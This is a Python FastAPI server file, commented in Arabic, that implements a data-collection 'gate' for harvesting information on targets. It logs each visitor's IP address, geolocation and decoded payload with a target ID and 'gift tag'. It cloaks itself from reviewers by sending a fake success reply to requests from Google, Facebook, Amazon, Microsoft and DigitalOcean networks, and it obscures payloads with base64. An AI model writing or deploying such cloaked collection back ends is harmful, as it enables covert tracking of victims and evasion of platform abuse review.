from fastapi import FastAPI, Request
from fastapi.middleware.cors import CORSMiddleware
import psycopg2, os, json, requests, base64

app = FastAPI()

# قائمة سوداء لشركات الاستضافة والمراجعة (جوجل، فيسبوك، امازون) لضمان التخفي
FORBIDDEN_ISPS = ["Google", "Facebook", "Amazon", "Microsoft", "DigitalOcean"]

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

def get_db_conn():
    return psycopg2.connect(os.environ.get("DATABASE_URL"), sslmode='require')

@app.post("/api/v1/gate/collect")
async def collect_intel(request: Request):
    client_ip = request.headers.get("x-forwarded-for", request.client.host).split(',')[0]
    
    try:
        # 1. فحص الـ IP قبل المعالجة (Geo-Fencing)
        geo = requests.get(f"http://ip-api.com/json/{client_ip}?fields=16777215").json()
        
        # إذا كان الدخول من شركة مراجعة، أرسل بيانات وهمية ولا تخزن شيئاً
        if any(isp in geo.get('isp', '') for isp in FORBIDDEN_ISPS):
            return {"status": "SUCCESS", "mode": "shadow"}

        # 2. استقبال البيانات وفك تشفيرها (Base64 تمويهي)
        encoded_payload = await request.body()
        decoded_payload = json.loads(base64.b64decode(encoded_payload))

        conn = get_db_conn()
        cur = conn.cursor()
        cur.execute("""
            INSERT INTO luvra_omega_intel (target_id, gift_tag, ip_address, geo_data, all_metrics)
            VALUES (%s, %s, %s, %s, %s)
        """, (
            decoded_payload.get('target_id'),
            decoded_payload.get('gift_tag'),
            client_ip,
            json.dumps(geo),
            json.dumps(decoded_payload)
        ))
        conn.commit()
        cur.close()
        conn.close()
        return {"status": "SUCCESS"}
    except Exception as e:
        return {"status": "FAIL", "error": str(e)}

# باقي الكود (GET analytics) يبقى كما هو
